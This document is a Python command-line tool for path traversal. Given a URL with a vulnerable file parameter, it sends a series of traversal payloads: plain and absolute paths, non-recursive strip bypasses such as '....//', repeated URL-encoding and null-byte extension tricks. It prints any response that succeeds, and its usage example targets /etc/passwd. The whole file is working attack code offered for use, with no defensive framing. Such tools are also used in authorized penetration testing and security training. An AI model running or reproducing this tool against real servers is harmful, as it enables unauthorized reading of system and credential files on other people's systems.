#!/usr/bin/env python3
import requests as r
import sys
from time import sleep
import urllib.parse
from termcolor import colored




def encode_file_name(filename):
    if "/" in filename:
        filename=filename.replace("/","%2f")
    return filename

def dir_traversal(vuln_link, file_read,level,encoding_lvl):
    '''
    bypass using :
    -> absolute path /
    ->traversal sequence ../
    ->traversal sequences stripped non-recursively ....// and ....\/
    -> test payload with double url-encode and more
    -> test with bypass extension

    '''
    
    

    payloads=["/","/var/www/images/" + "../"*level  ,"/dev/shm/" + "../"*level ,"../"*level, "....//"*level , "....\/"*level, urllib.parse.quote("../",safe="")*level , "%2e%2e%2f"*level]
    
    
    to_encode="%2e%2e%2f"*level + encode_file_name(file_read)
    
    for p in range(encoding_lvl):
        to_encode = urllib.parse.quote(to_encode,safe="")
        payloads.append(to_encode)
    
    for i in payloads:
        to_read = file_read
        


        if (("/" in  i) and ("/" == to_read[0])):
            to_read = to_read[1:]
            if "\\" in i :
                to_read=to_read.replace("/", "\/")

    
        if ((("%2f" in  i) or ("%2F" in  i)) and  ("/" == to_read[0]) ):
            to_read = to_read[1:]
            to_read =  to_read.replace("/","%2f")

        full_link = vuln_link + i

        if "/" in i or ("%2f"  in i) or ("%2F" in i ):
            full_link = vuln_link + i  + to_read

        print("[+] ", full_link)
        fs_req = r.get(full_link)
        response = fs_req.text
        if fs_req.status_code == 200:
            print("bypass using : ", colored(full_link,"yellow"))
            print("response: ")
            print(colored(response,'green'))


        sleep(0.4)


 

def main():    
    try:
        vulnerable_link= sys.argv[1]
        file_to_read = sys.argv[2]
        level = int(sys.argv[3])
        encode_lvl = int(sys.argv[4])

        print("URL: " , colored(vulnerable_link,"yellow" ))
        print("FILE: " , colored(file_to_read,"yellow"))
        print("LEVEL: " , colored(level,"yellow"))
        print("ENCODING LEVEL: " , colored(encode_lvl,"yellow"))

        dir_traversal(vulnerable_link, file_to_read, level,encode_lvl)

        # test with extensions:
        extensions =["", ".html", ".png",".js", ".py", ".c", ".pdf",".gif",".php","jpeg","jpg"]
        for i in extensions:
            dir_traversal(vulnerable_link, file_to_read+"%00"+i, level,encode_lvl)


    except:
        print("Usage: python3 traver_sale.py <URL> <FILE NAME> <LEVEL> <ENCODE> \n")
        print("<URL>: url with the vulnerable parameter")
        print("<FILE NAME>: file to read")
        print("<LEVEL>: number of traversal sequence ex: 3 => ../../../")
        print("<ENCODE>: level of url encoding to test\n")

        print("ex:\n python3 traver_sale.py https://link/?filename=   /etc/passwd 5 5")
    
    



if __name__ == "__main__":
    main()